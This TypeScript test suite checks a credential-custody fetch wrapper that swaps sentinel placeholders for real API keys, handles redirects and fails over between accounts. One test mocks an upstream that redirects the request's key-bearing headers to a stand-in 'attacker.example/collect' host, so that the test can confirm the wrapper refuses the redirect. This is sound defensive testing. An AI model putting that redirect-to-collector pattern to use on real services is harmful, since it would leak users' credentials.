import { afterEach, describe, expect, test } from "bun:test";
import { chmod, mkdir, rm, writeFile } from "node:fs/promises";
import { join } from "node:path";

import { ClaustrumCredentialError, type ServedCredential } from "@cortexkit/claustrum-client";

import { CustodySplitError } from "../errors";
import { createServeFetch } from "../serve";
import { sentinel, tombstoneFor } from "../tombstone";

const ROOT = "/tmp/opencode/custody-t7";
const PROVIDER = "deepseek";
const SENTINEL = sentinel(PROVIDER);
const MAIN_HANDLE = `ckh_${"a".repeat(43)}`;
const BACKUP_HANDLE = `ckh_${"b".repeat(43)}`;

type Account = { label: string; handle: string };
type Report = { handle: string; providerStatus: number; recordVersion: number; reporterSource: "direct" };

const accounts: Account[] = [
  { label: "main", handle: MAIN_HANDLE },
  { label: "backup", handle: BACKUP_HANDLE },
];

class FakeClient {
  readonly reports: Report[] = [];
  readonly gets: string[] = [];

  constructor(private readonly credentials: Map<string, ServedCredential | Error>) {}

  async getCredential(handle: string): Promise<ServedCredential> {
    this.gets.push(handle);
    const result = this.credentials.get(handle);
    if (!result) throw new Error(`missing fixture credential for ${handle}`);
    if (result instanceof Error) throw result;
    return result;
  }

  async reportAuthFailure(report: Report): Promise<void> {
    this.reports.push(report);
  }
}

function credential(material: string, recordVersion: number): ServedCredential {
  return { material, recordVersion, expiresAtMs: null };
}

function clientWith(
  main: ServedCredential | Error = credential("material-main", 7),
  backup: ServedCredential | Error = credential("material-backup", 8),
) {
  return new FakeClient(new Map([[MAIN_HANDLE, main], [BACKUP_HANDLE, backup]]));
}

function createUpstream(statuses: Array<number | Response>, requests: Request[]) {
  return async (request: RequestInfo | URL, init?: RequestInit): Promise<Response> => {
    const forwarded = new Request(request, init);
    requests.push(forwarded);
    for (const [name, value] of forwarded.headers) {
      if (value.includes(SENTINEL)) throw new Error(`sentinel forwarded in ${name}`);
    }
    if (forwarded.url.includes(encodeURIComponent(SENTINEL)) || forwarded.url.includes(SENTINEL)) {
      throw new Error("sentinel forwarded in URL");
    }
    const next = statuses.shift();
    return next instanceof Response ? next : new Response("upstream", { status: next ?? 200 });
  };
}

function serve(input: {
  client?: FakeClient;
  upstream?: (request: RequestInfo | URL, init?: RequestInit) => Promise<Response>;
  now?: () => number;
  readAuthEntry?: () => Promise<unknown> | unknown;
  accounts?: Account[];
}) {
  return createServeFetch({
    provider: PROVIDER,
    accounts: input.accounts ?? accounts,
    client: input.client ?? clientWith(),
    readAuthEntry: input.readAuthEntry ?? (() => tombstoneFor("api", PROVIDER)),
    upstreamFetch: input.upstream ?? (async () => new Response("upstream", { status: 200 })),
    now: input.now,
  });
}

async function fixture(name: string) {
  const root = join(ROOT, name);
  await mkdir(root, { recursive: true });
  const auth = join(root, "auth.json");
  const handles = join(root, "opencode-handles.json");
  await writeFile(handles, JSON.stringify({
    version: 1,
    providers: [{ provider: PROVIDER, shape: "api", serve: "opencode-claustrum", accounts }],
  }));
  await chmod(handles, 0o600);
  return { auth, handles };
}

afterEach(async () => {
  await rm(ROOT, { recursive: true, force: true });
});

describe("OpenCode custody serve fetch", () => {
  test("substitutes every sentinel occurrence in every header value", async () => {
    const requests: Request[] = [];
    const fetch = serve({ upstream: createUpstream([200], requests) });

    await fetch("https://upstream.example/v1/chat", {
      headers: {
        Authorization: `Bearer ${SENTINEL}; ${SENTINEL}`,
        "X-Api-Key": SENTINEL,
      },
    });

    expect(requests).toHaveLength(1);
    expect(requests[0]?.headers.get("authorization")).toBe("Bearer material-main; material-main");
    expect(requests[0]?.headers.get("x-api-key")).toBe("material-main");
  });

  test("substitutes every sentinel occurrence in URL query parameter values", async () => {
    const requests: Request[] = [];
    const fetch = serve({ upstream: createUpstream([200], requests) });

    await fetch(`https://upstream.example/v1/chat?key=${encodeURIComponent(SENTINEL)}&key=before-${encodeURIComponent(SENTINEL)}-after`);

    const url = new URL(requests[0]?.url ?? "");
    expect(url.searchParams.getAll("key")).toEqual(["material-main", "before-material-main-after"]);
  });

  test("reports the credential version used for a 401, clears its cache, and tries the next account", async () => {
    const requests: Request[] = [];
    let currentRecordVersion = 7;
    const client = clientWith({
      material: "material-main",
      get recordVersion() {
        return currentRecordVersion;
      },
      expiresAtMs: null,
    });
    let attempt = 0;
    const fetch = serve({
      client,
      upstream: async (request) => {
        requests.push(new Request(request));
        attempt += 1;
        if (attempt === 1) {
          currentRecordVersion = 9;
          return new Response("unauthorized", { status: 401 });
        }
        return new Response("upstream", { status: 200 });
      },
    });

    expect((await fetch("https://upstream.example/v1/chat")).status).toBe(200);
    expect((await fetch("https://upstream.example/v1/chat")).status).toBe(200);

    expect(client.reports).toEqual([{
      handle: MAIN_HANDLE,
      providerStatus: 401,
      recordVersion: 7,
      reporterSource: "direct",
    }]);
    expect(client.gets).toEqual([MAIN_HANDLE, BACKUP_HANDLE, MAIN_HANDLE]);
    expect(requests).toHaveLength(3);
  });

  test("rewrites POST to GET and drops its body for same-origin 301 and 302 redirects", async () => {
    for (const status of [301, 302]) {
      const requests: Request[] = [];
      const fetch = serve({
        upstream: async (request) => {
          const forwarded = new Request(request);
          requests.push(forwarded);
          return requests.length === 1
            ? new Response(null, { status, headers: { Location: "/v1/final?key=" + encodeURIComponent(SENTINEL) } })
            : new Response("upstream", { status: 200 });
        },
      });

      expect((await fetch(`https://upstream.example/v1/chat?key=${encodeURIComponent(SENTINEL)}`, {
        method: "POST",
        headers: { "X-Api-Key": SENTINEL },
        body: "request-body",
      })).status).toBe(200);
      expect(requests).toHaveLength(2);
      expect(requests[1]?.url).toContain("key=material-main");
      expect(requests[1]?.headers.get("x-api-key")).toBe("material-main");
      expect(requests[1]?.method).toBe("GET");
      expect(await requests[1]?.text()).toBe("");
    }
  });

  test("turns a same-origin 303 into a GET before forwarding", async () => {
    const requests: Request[] = [];
    const fetch = serve({
      upstream: async (request) => {
        const forwarded = new Request(request);
        requests.push(forwarded);
        return forwarded.url.endsWith("/start")
          ? new Response(null, { status: 303, headers: { Location: "/final" } })
          : new Response("ok");
      },
    });

    expect((await fetch("https://upstream.example/start", { method: "POST", body: "body" })).status).toBe(200);
    expect(requests[1]?.method).toBe("GET");
  });

  test("keeps the GET and empty body after a 303 followed by a 307", async () => {
    const requests: Request[] = [];
    const fetch = serve({
      upstream: async (request) => {
        const forwarded = new Request(request);
        requests.push(forwarded);
        if (forwarded.url.endsWith("/start")) {
          return new Response(null, { status: 303, headers: { Location: "/middle" } });
        }
        if (forwarded.url.endsWith("/middle")) {
          return new Response(null, { status: 307, headers: { Location: "/final" } });
        }
        return new Response("ok");
      },
    });

    expect((await fetch("https://upstream.example/start", { method: "POST", body: "body" })).status).toBe(200);
    expect(requests).toHaveLength(3);
    expect(requests[1]?.method).toBe("GET");
    expect(await requests[1]?.text()).toBe("");
    expect(requests[2]?.method).toBe("GET");
    expect(await requests[2]?.text()).toBe("");
  });

  test("preserves a POST and body across same-origin 307 and 308 redirects", async () => {
    for (const status of [307, 308]) {
      const requests: Request[] = [];
      const fetch = serve({
        upstream: async (request) => {
          requests.push(new Request(request));
          return requests.length === 1
            ? new Response(null, { status, headers: { Location: "/final" } })
            : new Response("ok");
        },
      });

      expect((await fetch("https://upstream.example/start", { method: "POST", body: "body" })).status).toBe(200);
      expect(requests[1]?.method).toBe("POST");
      expect(await requests[1]?.text()).toBe("body");
    }
  });

  test("refuses a cross-origin redirect before an attacker receives substituted headers or can report 401", async () => {
    const attackerRequests: Request[] = [];
    const client = clientWith();
    const upstream = async (request: RequestInfo | URL): Promise<Response> => {
      const forwarded = new Request(request);
      if (new URL(forwarded.url).origin === "https://attacker.example") {
        attackerRequests.push(forwarded);
        return new Response("unauthorized", { status: 401 });
      }
      if (forwarded.redirect !== "manual") {
        return upstream(new Request("https://attacker.example/collect", {
          method: forwarded.method,
          headers: forwarded.headers,
        }));
      }
      return new Response(null, { status: 302, headers: { Location: "https://attacker.example/collect" } });
    };
    const fetch = serve({ client, upstream });

    await expect(fetch("https://upstream.example/v1/chat", { headers: { "X-Api-Key": SENTINEL } }))
      .rejects.toThrow("custody redirect refused");
    expect(attackerRequests).toEqual([]);
    expect(client.reports).toEqual([]);
  });

  test("uses Retry-After seconds, HTTP dates, and a 60-second fallback before failing over", async () => {
    for (const retryAfter of ["2", new Date(1_005_000).toUTCString(), "nonsense"]) {
      const requests: Request[] = [];
      const client = clientWith();
      let time = 1_000_000;
      const fetch = serve({
        client,
        now: () => time,
        upstream: createUpstream([
          new Response("slow down", { status: 429, headers: { "Retry-After": retryAfter } }),
          200,
          200,
        ], requests),
      });

      expect((await fetch("https://upstream.example/v1/chat")).status).toBe(200);
      time += 1_000;
      expect((await fetch("https://upstream.example/v1/chat")).status).toBe(200);

      expect(client.gets).toEqual([MAIN_HANDLE, BACKUP_HANDLE]);
      expect(requests).toHaveLength(3);
    }
  });

  test("puts a 402 account on a one-hour cooldown before trying the next account", async () => {
    const requests: Request[] = [];
    const client = clientWith();
    let time = 1_000_000;
    const fetch = serve({ client, now: () => time, upstream: createUpstream([402, 200, 200], requests) });

    expect((await fetch("https://upstream.example/v1/chat")).status).toBe(200);
    time += 3_599_000;
    expect((await fetch("https://upstream.example/v1/chat")).status).toBe(200);

    expect(client.gets).toEqual([MAIN_HANDLE, BACKUP_HANDLE, BACKUP_HANDLE]);
    expect(requests).toHaveLength(3);
  });

  test("returns 403 immediately without reporting or failover", async () => {
    const requests: Request[] = [];
    const client = clientWith();
    const fetch = serve({ client, upstream: createUpstream([403, 200], requests) });

    expect((await fetch("https://upstream.example/v1/chat")).status).toBe(403);
    expect(client.reports).toEqual([]);
    expect(client.gets).toEqual([MAIN_HANDLE]);
    expect(requests).toHaveLength(1);
  });

  test("returns 5xx immediately without reporting or failover", async () => {
    const requests: Request[] = [];
    const client = clientWith();
    const fetch = serve({ client, upstream: createUpstream([503, 200], requests) });

    expect((await fetch("https://upstream.example/v1/chat")).status).toBe(503);
    expect(client.reports).toEqual([]);
    expect(client.gets).toEqual([MAIN_HANDLE]);
    expect(requests).toHaveLength(1);
  });

  test("re-reads auth.json and throws split custody before forwarding a real local key", async () => {
    const files = await fixture("split-custody");
    await writeFile(files.auth, JSON.stringify({ [PROVIDER]: { type: "api", key: "real-local-key" } }));
    await chmod(files.auth, 0o600);
    let forwarded = 0;
    const fetch = serve({
      readAuthEntry: async () => JSON.parse(await Bun.file(files.auth).text())[PROVIDER],
      upstream: async (request) => {
        forwarded += 1;
        if (new Request(request).url.includes("real-local-key")) throw new Error("real local key forwarded");
        return new Response("must not forward");
      },
    });

    await expect(fetch(`https://upstream.example/v1/chat?key=${encodeURIComponent(SENTINEL)}`)).rejects.toBeInstanceOf(CustodySplitError);
    expect(forwarded).toBe(0);
  });

  test("wraps an auth read failure as a custody refusal before forwarding", async () => {
    let forwarded = 0;
    const fetch = serve({
      readAuthEntry: () => { throw new SyntaxError("torn auth json"); },
      upstream: async () => {
        forwarded += 1;
        return new Response("must not forward");
      },
    });

    await expect(fetch("https://upstream.example/v1/chat")).rejects.toHaveProperty("name", "CustodyAuthReadError");
    expect(forwarded).toBe(0);
  });

  test("bounds a hung auth-failure report before failing over", async () => {
    const client = {
      getCredential: async (handle: string) => handle === MAIN_HANDLE ? credential("main", 1) : credential("backup", 2),
      reportAuthFailure: async () => new Promise<void>(() => {}),
    };
    let requests = 0;
    const fetch = createServeFetch({
      provider: PROVIDER,
      accounts,
      client,
      readAuthEntry: () => tombstoneFor("api", PROVIDER),
      upstreamFetch: async () => new Response("upstream", { status: ++requests === 1 ? 401 : 200 }),
    });

    const result = await Promise.race([
      fetch("https://upstream.example/v1/chat"),
      new Promise<Response>((_, reject) => setTimeout(() => reject(new Error("report exceeded 250ms budget")), 250)),
    ]);
    expect(result.status).toBe(200);
    expect(requests).toBe(2);
  });

  test("names only provider and account state summaries when all accounts are exhausted", async () => {
    const requests: Request[] = [];
    const client = clientWith(
      new ClaustrumCredentialError("not_found", "permanent", "gone"),
      credential("material-backup", 8),
    );
    const fetch = serve({
      client,
      upstream: createUpstream([new Response("slow down", { status: 429 }), 200], requests),
    });

    await expect(fetch("https://upstream.example/v1/chat")).rejects.toThrow(/provider=deepseek.*main:gone.*backup:cooldown.*ck auth migrate-opencode/);
    try {
      await fetch("https://upstream.example/v1/chat");
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      expect(message).not.toContain(MAIN_HANDLE);
      expect(message).not.toContain("material-backup");
      expect(message).not.toContain(SENTINEL);
    }
    expect(requests).toHaveLength(1);
  });
});
